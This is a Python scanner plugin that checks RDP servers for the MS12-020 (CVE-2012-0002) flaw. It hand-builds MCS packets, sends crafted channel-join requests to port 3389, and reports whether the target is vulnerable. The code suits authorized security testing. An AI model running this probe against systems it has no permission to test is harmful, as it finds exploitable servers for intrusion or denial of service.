#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
import socket
from struct import pack,unpack

def get_plugin_info():
    plugin_info = {
        "name": "rdp 蓝屏 ms12-020",
        "desc": "Microsoft远程桌面协议RDP远程代码可执行漏洞(CVE-2012-0002)(MS12-020)",
        "grade": "高",
        "type": "service",
        "keyword": "service:ms-wbt-server tag:rdp cve:cve-2012-0002 tag:ms12-020 port:3389"
    }
    return plugin_info

target_params = (b""
    + b"\x02\x01\x22" # maxChannelIds
    + b"\x02\x01\x20" # maxUserIds
    + b"\x02\x01\x00" # maxTokenIds
    + b"\x02\x01\x01" # numPriorities
    + b"\x02\x01\x00" # minThroughput
    + b"\x02\x01\x01" # maxHeight
    + b"\x02\x02\xff\xff" # maxMCSPDUSize
    + b"\x02\x01\x02" # protocolVersion
)
min_params = (b""
    + b"\x02\x01\x01" # maxChannelIds       
    + b"\x02\x01\x01" # maxUserIds          
    + b"\x02\x01\x01" # maxTokenIds         
    + b"\x02\x01\x01" # numPriorities       
    + b"\x02\x01\x00" # minThroughput       
    + b"\x02\x01\x01" # maxHeight           
    + b"\x02\x01\xff" # maxMCSPDUSize
    + b"\x02\x01\x02" # protocolVersion
)
max_params = (b""
    + b"\x02\x01\xff" # maxChannelIds           
    + b"\x02\x01\xff" # maxUserIds              
    + b"\x02\x01\xff" # maxTokenIds             
    + b"\x02\x01\x01" # numPriorities           
    + b"\x02\x01\x00" # minThroughput           
    + b"\x02\x01\x01" # maxHeight               
    + b"\x02\x02\xff\xff" # maxMCSPDUSize
    + b"\x02\x01\x02" # protocolVersion
)
mcs_data = (b""
    + b"\x04\x01\x01" # callingDomainSelector
    + b"\x04\x01\x01" # calledDomainSelector
    + b"\x01\x01\xff" # upwardFlag
    + b"\x30" + pack("B", len(target_params)) + target_params
    + b"\x30" + pack("B", len(min_params)) + min_params
    + b"\x30" + pack("B", len(max_params)) + max_params
    + b"\x04\x00" # userData
)
def make_tpkt(data):
    return pack("!BBH", 3, 0, 4+len(data)) + data

def make_x224(type, data):
    return pack("!BB", 1+len(data), type) + data

def make_rdp(type, flags, data):
    return pack("<BBH", type, flags, 4+len(data)) + data

def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':3389'
    host,port = check_port(arg).split(':')
    timeout = 5
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(timeout)
    try:
        sk.connect((host,int(port)))
        rdp = make_rdp(1, 0, pack("!I", 0))
        x224_1 = make_x224(0xe0, pack("!HHB", 0, 0, 0) + rdp)
        sk.send(b"\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00")
        data = sk.recv(8192)
        if data != b"\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00":
            return False
        else:
            x224_2 = make_x224(0xf0, pack("!B", 0x80))
            mcs = b"\x7f\x65" + pack("!B", len(mcs_data))
            sk.send(make_tpkt(x224_2 + mcs + mcs_data))
            sk.send(make_tpkt(x224_2 + b"\x28"))
            data = sk.recv(8192)
            user1 = unpack("!H", data[9:11])[0]

            sk.send(make_tpkt(x224_2 + b"\x28"))
            data = sk.recv(8192)
            user2 = unpack("!H", data[9:11])[0]
            sk.send(make_tpkt(x224_2 + b"\x38" + pack("!HH", user2, user2+1001)))
            data = sk.recv(8192)
            sk.send(make_tpkt(x224_2 + b"\x38" + pack("!HH", user1, user2+1001)))
            data = sk.recv(8192)
            sk.close()
            if data[7:9] == b"\x3e\x00":
                return True
            else:
                return False
    except Exception:
        return 
    
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
